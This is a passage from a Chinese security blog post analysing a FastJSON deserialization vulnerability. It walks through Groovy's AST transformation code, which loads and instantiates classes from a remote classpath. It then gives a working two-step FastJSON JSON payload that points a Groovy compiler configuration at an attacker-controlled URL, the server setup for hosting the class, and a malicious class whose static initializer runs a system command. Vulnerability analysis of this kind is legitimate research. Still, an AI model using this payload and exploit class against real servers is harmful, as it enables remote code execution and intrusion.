<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperations</span><span class="hljs-params">(CompilationUnit compilationUnit)</span> &#123;<br>    <span class="hljs-type">ASTTransformationsContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> compilationUnit.getASTTransformationsContext();<br>    addGlobalTransforms(context);<br>    compilationUnit.addPhaseOperation((source, ignore, classNode) -&gt; &#123;<br>        <span class="hljs-type">GroovyClassVisitor</span> <span class="hljs-variable">visitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ASTTransformationCollectorCodeVisitor</span>(source, compilationUnit.getTransformLoader());<br>        visitor.visitClass(classNode);<br>    &#125;, <span class="hljs-number">4</span>);<br>    CompilePhase[] var2 = CompilePhase.values();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.length;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    ......<br></code></pre></td></tr></table></figure>

<p>org.codehaus.groovy.transform.ASTTransformationVisitor#addGlobalTransforms(context)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addGlobalTransforms</span><span class="hljs-params">(ASTTransformationsContext context)</span> &#123;<br>    doAddGlobalTransforms(context, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>org.codehaus.groovy.transform.ASTTransformationVisitor#doAddGlobalTransforms(context, true)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAddGlobalTransforms</span><span class="hljs-params">(ASTTransformationsContext context, <span class="hljs-type">boolean</span> isFirstScan)</span> &#123;<br>	......<br>    <span class="hljs-keyword">if</span> (isFirstScan) &#123;<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var17</span> <span class="hljs-operator">=</span> transformNames.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var17.hasNext()) &#123;<br>            Map.Entry&lt;String, URL&gt; entry = (Map.Entry)var17.next();<br>            context.getGlobalTransformNames().add((String)entry.getKey());<br>        &#125;<br><br>        addPhaseOperationsForGlobalTransforms(context.getCompilationUnit(), transformNames, isFirstScan);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        transformNames.entrySet().removeIf((entryx) -&gt; &#123;<br>            <span class="hljs-keyword">return</span> !context.getGlobalTransformNames().add((String)entryx.getKey());<br>        &#125;);<br>        addPhaseOperationsForGlobalTransforms(context.getCompilationUnit(), transformNames, isFirstScan);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>org.codehaus.groovy.transform.ASTTransformationVisitor#doAddGlobalTransforms()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperationsForGlobalTransforms</span><span class="hljs-params">(CompilationUnit compilationUnit, Map&lt;String, URL&gt; transformNames, <span class="hljs-type">boolean</span> isFirstScan)</span> &#123;<br>    <span class="hljs-comment">//获取到被赋予远程classpath的GroovyClassLoader</span><br>    <span class="hljs-type">GroovyClassLoader</span> <span class="hljs-variable">transformLoader</span> <span class="hljs-operator">=</span> compilationUnit.getTransformLoader();<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> transformNames.entrySet().iterator();<br><br>    <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>        Map.Entry&lt;String, URL&gt; entry = (Map.Entry)var4.next();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//从远程加载class对象</span><br>            Class&lt;?&gt; gTransClass = transformLoader.loadClass((String)entry.getKey(), <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);<br>            <span class="hljs-type">GroovyASTTransformation</span> <span class="hljs-variable">transformAnnotation</span> <span class="hljs-operator">=</span> (GroovyASTTransformation)gTransClass.getAnnotation(GroovyASTTransformation.class);<br>            <span class="hljs-keyword">if</span> (transformAnnotation == <span class="hljs-literal">null</span>) &#123;<br>                compilationUnit.getErrorCollector().addWarning(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WarningMessage</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;Transform Class &quot;</span> + (String)entry.getKey() + <span class="hljs-string">&quot; is specified as a global transform in &quot;</span> + ((URL)entry.getValue()).toExternalForm() + <span class="hljs-string">&quot; but it is not annotated by &quot;</span> + GroovyASTTransformation.class.getName() + <span class="hljs-string">&quot; the global transform associated with it may fail and cause the compilation to fail.&quot;</span>, (CSTNode)<span class="hljs-literal">null</span>, (SourceUnit)<span class="hljs-literal">null</span>));<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ASTTransformation.class.isAssignableFrom(gTransClass)) &#123;<br>                <span class="hljs-comment">//将远程类实例化</span><br>                <span class="hljs-type">ASTTransformation</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> (ASTTransformation)gTransClass.getDeclaredConstructor().newInstance();<br>                <span class="hljs-keyword">if</span> (instance <span class="hljs-keyword">instanceof</span> CompilationUnitAware) &#123;<br>                    ((CompilationUnitAware)instance).setCompilationUnit(compilationUnit);<br>                &#125;<br><br>                CompilationUnit.<span class="hljs-type">ISourceUnitOperation</span> <span class="hljs-variable">suOp</span> <span class="hljs-operator">=</span> (source) -&gt; &#123;<br>                    instance.visit(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ASTNode</span>[]&#123;source.getAST()&#125;, source);<br>                &#125;;<br>                <span class="hljs-keyword">if</span> (isFirstScan) &#123;<br>                    compilationUnit.addPhaseOperation(suOp, transformAnnotation.phase().getPhaseNumber());<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    compilationUnit.addNewPhaseOperation(suOp, transformAnnotation.phase().getPhaseNumber());<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                compilationUnit.getErrorCollector().addError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleMessage</span>(<span class="hljs-string">&quot;Transform Class &quot;</span> + (String)entry.getKey() + <span class="hljs-string">&quot; specified at &quot;</span> + ((URL)entry.getValue()).toExternalForm() + <span class="hljs-string">&quot; is not an ASTTransformation.&quot;</span>, (ProcessingUnit)<span class="hljs-literal">null</span>));<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>            <span class="hljs-type">Throwable</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> var10 <span class="hljs-keyword">instanceof</span> InvocationTargetException ? var10.getCause() : var10;<br>            compilationUnit.getErrorCollector().addError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleMessage</span>(<span class="hljs-string">&quot;Could not instantiate global transform class &quot;</span> + (String)entry.getKey() + <span class="hljs-string">&quot; specified at &quot;</span> + ((URL)entry.getValue()).toExternalForm() + <span class="hljs-string">&quot;  because of exception &quot;</span> + ((Throwable)t).toString(), (ProcessingUnit)<span class="hljs-literal">null</span>));<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-number">1.</span>利用隐式类关系将org.codehaus.groovy.control.org.codehaus.groovy.control.ProcessingUnit、org.codehaus.groovy.control.CompilerConfiguration加入到maping中<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;unit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-number">2.</span>利用链加载远程类<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="hljs-punctuation">,</span><br>           <span class="hljs-attr">&quot;classpath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;url地址xxx&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>服务器配置：</p>
<p>新建文件 META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation</p>
<p>文件内容为MyExction</p>
<p>http根目录放置MyExction.class</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.ast.ASTNode;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.control.SourceUnit;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;<br><br><span class="hljs-meta">@GroovyASTTransformation</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyExction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ASTTransformation</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(ASTNode[] astNodes, SourceUnit sourceUnit)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var1);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/92e85c41-0a14-438a-82c0-9b4ef077db7a.png" srcset="/img/loading.gif" lazyload alt="image-20220922165655351"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>FastJSON反序列化漏洞解析</div>
      <div>http://example.com/2023/04/14/FastJSON反序列化漏洞解析/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年4月14日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/04/23/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%8C-Apache-Druid-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="Kafka命令执行漏洞二-Apache Druid 代码执行漏洞">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Kafka命令执行漏洞二-Apache Druid 代码执行漏洞</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
